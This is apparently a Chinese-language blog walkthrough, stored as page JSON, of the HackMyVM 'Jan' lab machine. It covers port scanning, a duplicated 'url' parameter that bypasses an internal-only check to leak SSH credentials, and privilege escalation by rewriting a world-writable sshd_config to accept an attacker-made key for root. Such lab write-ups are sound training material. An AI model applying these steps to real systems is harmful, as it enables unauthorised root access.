{"pageProps":{"postData":{"id":"HackMyVMJan","contentHtml":"<h1>Jan.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=jan\">https://hackmyvm.eu/machines/machine.php?vm=jan</a></p>\n</blockquote>\n<p>Notes: <strong>CTF Like. Have fun!</strong></p>\n<h2>信息收集</h2>\n<p><code>17</code>是靶机</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nmap -sP 192.168.56.0/24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-06 06:<span class=\"hljs-number\">53</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00051</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00039</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:F4:7E:<span class=\"hljs-number\">34</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.17</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00043</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:4B:C2:B9 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nHost <span class=\"hljs-keyword\">is</span> up.\nNmap done: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">4</span> hosts up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">15.16</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nmap -sT -min-rate 10000 -p- 192.168.56.17</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-06 06:<span class=\"hljs-number\">54</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.17</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">8080</span>/tcp <span class=\"hljs-built_in\">open</span>  http-proxy\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:4B:C2:B9 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nmap -sT -A -T4 -p 22,8080 192.168.56.17</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-06 06:<span class=\"hljs-number\">55</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.17</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00063</span>s latency).\n\nPORT     STATE SERVICE    VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh        OpenSSH <span class=\"hljs-number\">9.9</span> (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> 2c:0b:<span class=\"hljs-number\">57</span>:a2:b3:e2:0f:6a:c0:<span class=\"hljs-number\">61</span>:f2:b7:1f:<span class=\"hljs-number\">56</span>:b4:<span class=\"hljs-number\">42</span> (ECDSA)\n|_  <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">97</span>:b0:2b:<span class=\"hljs-number\">48</span>:9b:4a:<span class=\"hljs-number\">36</span>:8e:db:<span class=\"hljs-number\">44</span>:bd:3f:<span class=\"hljs-number\">15</span>:cf:<span class=\"hljs-number\">32</span> (ED25519)\n<span class=\"hljs-number\">8080</span>/tcp <span class=\"hljs-built_in\">open</span>  http-proxy\n|_http-<span class=\"hljs-built_in\">open</span>-proxy: Proxy might be redirecting requests\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/plain; charset=utf-8).\n| fingerprint-strings: \n|   FourOhFourRequest, GetRequest, HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Date: Thu, 06 Feb 2025 11:55:57 GMT\n|     Content-Length: 45\n|     Content-Type: text/plain; charset=utf-8\n|     Welcome to our Public Server. Maybe Internal.\n|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|_    Request\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.94SVN%I=7%D=2/6%Time=67A4A34F%P=x86_64-pc-linux-gnu%r(\nSF:GetRequest,A2,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Thu,\\x2006\\x20Feb\\x20\nSF:2025\\x2011:55:57\\x20GMT\\r\\nContent-Length:\\x2045\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\n\\r\\nWelcome\\x20to\\x20our\\x20Public\\x20Ser\nSF:ver\\.\\x20Maybe\\x20Internal\\.\")%r(HTTPOptions,A2,\"HTTP/1\\.0\\x20200\\x20OK\nSF:\\r\\nDate:\\x20Thu,\\x2006\\x20Feb\\x202025\\x2011:55:57\\x20GMT\\r\\nContent-Le\nSF:ngth:\\x2045\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nWel\nSF:come\\x20to\\x20our\\x20Public\\x20Server\\.\\x20Maybe\\x20Internal\\.\")%r(RTSP\nSF:Request,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\nSF:equest\")%r(FourOhFourRequest,A2,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Thu\nSF:,\\x2006\\x20Feb\\x202025\\x2011:55:57\\x20GMT\\r\\nContent-Length:\\x2045\\r\\nC\nSF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nWelcome\\x20to\\x20ou\nSF:r\\x20Public\\x20Server\\.\\x20Maybe\\x20Internal\\.\")%r(Socks5,67,\"HTTP/1\\.1\nSF:\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=ut\nSF:f-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(GenericLin\nSF:es,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plai\nSF:n;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reques\nSF:t\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(SSLSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nC\nSF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\\nSF:n\\r\\n400\\x20Bad\\x20Request\")%r(TerminalServerCookie,67,\"HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TLSSessionReq,67\nSF:,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x2\nSF:0charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r\nSF:(Kerberos,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request\")%r(LPDString,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConten\nSF:t-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n\nSF:400\\x20Bad\\x20Request\");\nMAC Address: 08:00:27:4B:C2:B9 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.63 ms 192.168.56.17\n</span></code></pre>\n<p>使用过<code>nmap</code>的<code>script</code>模块扫描漏洞的时候会卡住，所以就没有这一步骤</p>\n<p>优先级：<code>8080</code> > <code>22</code></p>\n<h2>8080 端口渗透</h2>\n<p>访问主页：<code>Welcome to our Public Server. Maybe Internal.</code> （欢迎来到我们的公共服务器，也可能是内部服务器）意味深长</p>\n<p><img src=\"/post-images/HackMyVMJan/image55.png\" alt=\"image.png\"></p>\n<p>扫描一下目录</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># dirsearch -u 192.168.56.17:8080 -x 403 -e php,zip,txt</span>\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class=\"hljs-number\">23</span>: DeprecationWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  <span class=\"hljs-keyword\">from</span> pkg_resources <span class=\"hljs-keyword\">import</span> DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.3</span>\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, <span class=\"hljs-built_in\">zip</span>, txt | HTTP method: GET | Threads: <span class=\"hljs-number\">25</span> | Wordlist size: <span class=\"hljs-number\">10439</span>\n\nOutput File: /root/reports/_192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.17_8080</span>/_25-02-06_07-<span class=\"hljs-number\">14</span>-<span class=\"hljs-number\">59.</span>txt\n\nTarget: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.17</span>:<span class=\"hljs-number\">8080</span>/\n\n[07:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">59</span>] Starting: \n[07:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">301</span> -   57B  - /%2e%2e//google.com  ->  /%252E%252E/google.com   \n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp     \n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">301</span> -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">301</span> -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">20</span>] <span class=\"hljs-number\">301</span> -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">301</span> -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">24</span>] <span class=\"hljs-number\">301</span> -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf\n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">400</span> -   24B  - /redirect                                         \n[07:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">200</span> -   16B  - /robots.txt                                       \n                                                                             \nTask Completed\n\n</code></pre>\n<p>存在<code>robots.txt</code>文件，提示了两个路径</p>\n<pre><code class=\"hljs language-python\">/redirect\n/credz\n</code></pre>\n<p>分别访问两个路径，首先是<code>redirect</code> ，提示需要一个<code>url</code>参数</p>\n<p><img src=\"/post-images/HackMyVMJan/image56.png\" alt=\"image.png\"></p>\n<p>然后是<code>credz</code> ，提示：<code>Only accessible internally.</code> （仅供内部访问）</p>\n<p><img src=\"/post-images/HackMyVMJan/image57.png\" alt=\"image.png\"></p>\n<p>这里应该是要使用<code>redirect</code> 使用<code>url</code>参数来指向<code>credz</code> ，来尝试一下</p>\n<p>但是会发现提示：<code>Only accessible internally.</code></p>\n<p><img src=\"/post-images/HackMyVMJan/image58.png\" alt=\"image.png\"></p>\n<p>最后经过测试发现在<code>/redirect</code> 加上<code>url</code>参数后就会提示<code>Only accessible internally.</code> ，这应该是要有别的做法</p>\n<p>然后再尝试一下使用<code>X-Forwarded-For</code> ，但是我尝试了一会还是一无所获</p>\n<p><img src=\"/post-images/HackMyVMJan/image59.png\" alt=\"image.png\"></p>\n<p>但是这是<code>CTF</code>题，所以尝试使用两个<code>url</code> 参数</p>\n<p>最后通过构造：<code>/redirect?url=1&#x26;url=/credz</code> 成功获取到信息</p>\n<p><img src=\"/post-images/HackMyVMJan/image60.png\" alt=\"image.png\"></p>\n<p>这一看应该是个<code>ssh</code> 账户，一开始以为<code>EazyLOL</code>是个账户，但是通过密码爆破后无果，最后发现<code>ssh</code>是账户，<code>EazyLOL</code> 是密码</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># ssh ssh@192.168.56.17</span>\nssh@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.17</span><span class=\"hljs-string\">'s password: \nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee &#x3C;https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~$ \n</span></code></pre>\n<h2>UserFlag</h2>\n<p>进来后就可以在当前目录发现<code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">jan:~$ cat user.txt\nHMVSxxxxxxxxxxTHFK\n</code></pre>\n<h2>内网信息收集</h2>\n<p>查看<code>jan</code>用户<code>sudo</code>权限</p>\n<pre><code class=\"hljs language-python\">jan:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> ssh on jan:\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nRunas <span class=\"hljs-keyword\">and</span> Command-specific defaults <span class=\"hljs-keyword\">for</span> ssh:\n    Defaults!/usr/sbin/visudo env_keep+=<span class=\"hljs-string\">\"SUDO_EDITOR EDITOR VISUAL\"</span>\n\nUser ssh may run the following commands on jan:\n    (root) NOPASSWD: /sbin/service sshd restart\n</code></pre>\n<p>发现可以在使用<code>root</code>权限来执行<code>/sbin/service sshd restart</code> ，应该重点是在<code>ssh</code>服务上了</p>\n<h2>提权 - ssh 公钥劫持</h2>\n<ol>\n<li>\n<p>查看一下<code>ssh</code>目录的权限，发现<code>ssh_config</code> 和<code>sshd_config</code> 拥有修改权限</p>\n<pre><code class=\"hljs language-python\">jan:/etc/ssh$ ls -al\ntotal <span class=\"hljs-number\">580</span>\ndrwxr-xr-x    <span class=\"hljs-number\">4</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">28</span> 09:02 .\ndrwxr-xr-x   <span class=\"hljs-number\">32</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">25</span> ..\n-rw-r--r--    <span class=\"hljs-number\">1</span> root     root        <span class=\"hljs-number\">541716</span> Dec  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">15</span>:08 moduli\n-rw-rw-rw-    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">1708</span> Jan <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">30</span> ssh_config\ndrwxr-xr-x    <span class=\"hljs-number\">2</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">28</span> 09:02 ssh_config.d\n-rw-------    <span class=\"hljs-number\">1</span> root     root           <span class=\"hljs-number\">505</span> Jan <span class=\"hljs-number\">28</span> 09:01 ssh_host_ecdsa_key\n-rw-r--r--    <span class=\"hljs-number\">1</span> root     root           <span class=\"hljs-number\">170</span> Jan <span class=\"hljs-number\">28</span> 09:01 ssh_host_ecdsa_key.pub\n-rw-------    <span class=\"hljs-number\">1</span> root     root           <span class=\"hljs-number\">399</span> Jan <span class=\"hljs-number\">28</span> 09:01 ssh_host_ed25519_key\n-rw-r--r--    <span class=\"hljs-number\">1</span> root     root            <span class=\"hljs-number\">90</span> Jan <span class=\"hljs-number\">28</span> 09:01 ssh_host_ed25519_key.pub\n-rw-------    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">2590</span> Jan <span class=\"hljs-number\">28</span> 09:01 ssh_host_rsa_key\n-rw-r--r--    <span class=\"hljs-number\">1</span> root     root           <span class=\"hljs-number\">562</span> Jan <span class=\"hljs-number\">28</span> 09:01 ssh_host_rsa_key.pub\n-rw-rw-rw-    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">3355</span> Jan <span class=\"hljs-number\">28</span> 09:01 sshd_config\ndrwxr-xr-x    <span class=\"hljs-number\">2</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">28</span> 09:02 sshd_config.d\n</code></pre>\n</li>\n<li>\n<p><code>ssh-keygen -t rsa</code> 是用来生成 RSA 类型的 SSH 密钥对的命令。执行这个命令会生成一个公钥和一个私钥文件，用于 SSH 连接认证</p>\n<p>会在家目录生成<code>.ssh</code> 文件夹</p>\n<pre><code class=\"hljs language-python\">jan:~$ ssh-keygen -t rsa\nGenerating public/private rsa key pair.\nEnter file <span class=\"hljs-keyword\">in</span> which to save the key (/home/ssh/.ssh/id_rsa): \nCreated directory <span class=\"hljs-string\">'/home/ssh/.ssh'</span>.\nEnter passphrase <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"/home/ssh/.ssh/id_rsa\"</span> (empty <span class=\"hljs-keyword\">for</span> no passphrase): \nEnter same passphrase again: \nYour identification has been saved <span class=\"hljs-keyword\">in</span> /home/ssh/.ssh/id_rsa\nYour public key has been saved <span class=\"hljs-keyword\">in</span> /home/ssh/.ssh/id_rsa.pub\nThe key fingerprint <span class=\"hljs-keyword\">is</span>:\nSHA256:4Wrwsmcg6Ixn40sYR7Dm5XNkkrmmvEyyUrhvaYkEfEY ssh@jan\nThe key<span class=\"hljs-string\">'s randomart image is:\n+---[RSA 3072]----+\n|.                |\n| o Eo            |\n|o.o= o  .        |\n|+ooo=  . .       |\n|o++=..  S        |\n|+== +o .         |\n|BB.+..+          |\n|O=X  +o          |\n|oX+o.o           |\n+----[SHA256]-----+\njan:~$ \n</span></code></pre>\n</li>\n<li>\n<p>将<code>id_rsa.pub</code>名字进行修改，然后将内容的最后的结尾的<code>ssh</code>修改为<code>root</code>（不会影响加解密但是会将其混淆）</p>\n<pre><code class=\"hljs language-python\">jan:~/.ssh$ mv id_rsa.pub attack_keys\n</code></pre>\n<pre><code class=\"hljs language-python\">9fglITVq2jKR2UXcDNIYyZeMLz5LU7bUdQluDYSU/LmJ2FsaT7KQ1EAnZbsOGrZlz9/U56c8J+58DvCxCpJVhf5yxQITD11DAVlZQpxX+Ws2n72Sp9Myxzm1s9/2DcA4aueVI/zc8gLuN/WpWcWs= root@jan\n</code></pre>\n</li>\n<li>\n<p>修改<code>sshd_config</code>配置文件</p>\n<pre><code class=\"hljs language-python\">PermitRootLogin yes \nStrictModes no \nAuthorizedKeysFile      /home/ssh/.ssh/attack_keys\n</code></pre>\n<blockquote>\n<p>参数解释：</p>\n<ul>\n<li><strong>PermitRootLogin yes</strong>：允许 <code>root</code> 用户通过 SSH 登录。</li>\n<li><strong>StrictModes no</strong>：禁用权限严格检查，避免因权限问题阻止 SSH 登录。</li>\n<li><strong>AuthorizedKeysFile <code>/home/ssh/.ssh/attack_keys</code></strong>：指定使用自定义的公钥文件 <code>attack_keys</code>。</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>修改<code>ssh_config</code> ，注释掉<code>banner</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#Banner /etc/shadow</span>\n</code></pre>\n</li>\n<li>\n<p>重启服务，并使用密钥文件进行登录，即可获得<code>root</code>权限</p>\n<pre><code class=\"hljs language-python\">jan:~/.ssh$ sudo /sbin/service sshd restart\n * Stopping sshd ...                                                                                                                                   [ ok ]\n * Starting sshd ...                                                                                                                                   [ ok ]\njan:~/.ssh$ ssh root@localhost -i id_rsa\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides <span class=\"hljs-keyword\">and</span> general\ninformation about administrating Alpine systems.\nSee &#x3C;https://wiki.alpinelinux.org/>.\n\nYou can setup the system <span class=\"hljs-keyword\">with</span> the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\njan:~<span class=\"hljs-comment\"># ls</span>\nroot.txt  ver.sh\njan:~<span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root),<span class=\"hljs-number\">0</span>(root),<span class=\"hljs-number\">1</span>(<span class=\"hljs-built_in\">bin</span>),<span class=\"hljs-number\">2</span>(daemon),<span class=\"hljs-number\">3</span>(sys),<span class=\"hljs-number\">4</span>(adm),<span class=\"hljs-number\">6</span>(disk),<span class=\"hljs-number\">10</span>(wheel),<span class=\"hljs-number\">11</span>(floppy),<span class=\"hljs-number\">20</span>(dialout),<span class=\"hljs-number\">26</span>(tape),<span class=\"hljs-number\">27</span>(video)\njan:~<span class=\"hljs-comment\"># </span>\n\n</code></pre>\n</li>\n</ol>\n<h2>RootFlag</h2>\n<pre><code class=\"hljs language-python\">jan:~<span class=\"hljs-comment\"># cat root.txt </span>\nHMV2PRMxxxxxxNGMBG\n</code></pre>","title":"HackMyVM - Jan","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Jan.\n\n https://hackmyvm.eu/machines/machine.php?vm=jan\n \n\nNotes: CTF Like. Have fun!\n\n信息收集\n\n`17`是靶机\n\n\n\n\n\n\n\n使用过`nmap`的`script`模块扫描漏洞的时候会卡住，所以就没有这一步骤\n\n优先级：`8080`  `22`\n\n8080 端口渗透\n\n访问主页：`Welcome to our P..."},"recentPosts":[{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"}]},"__N_SSG":true}